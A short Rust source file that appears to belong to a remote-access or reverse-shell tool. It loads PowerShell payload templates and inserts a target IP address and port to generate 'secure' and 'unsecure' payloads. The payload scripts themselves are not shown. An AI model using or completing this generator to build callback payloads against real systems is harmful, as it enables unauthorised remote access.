use std::net::Ipv4Addr;

use crate::APPLICATION;

static PAYLOAD_SECURE: &'static str = include_str!("./templates/payload_secure.ps1");
static PAYLOAD_UNSECURE: &'static str = include_str!("./templates/payload_unsecure.ps1");

#[derive(Clone, Copy)]
pub enum PayloadType {
    SECURE,
    UNSECURE
}

pub fn generate_payload(payload: PayloadType, addr: Ipv4Addr) -> String {
    if let Ok(app) = APPLICATION.lock() {
        match payload {
            PayloadType::SECURE => {
                return PAYLOAD_SECURE.replace("#IP_ADDRESS", &addr.to_string()).replace("#PORT", &app.port.to_string());
            },
            PayloadType::UNSECURE => {
                return PAYLOAD_UNSECURE.replace("#IP_ADDRESS", &addr.to_string()).replace("#PORT", &app.port.to_string());
            },
        }
    }
    "".to_string()
}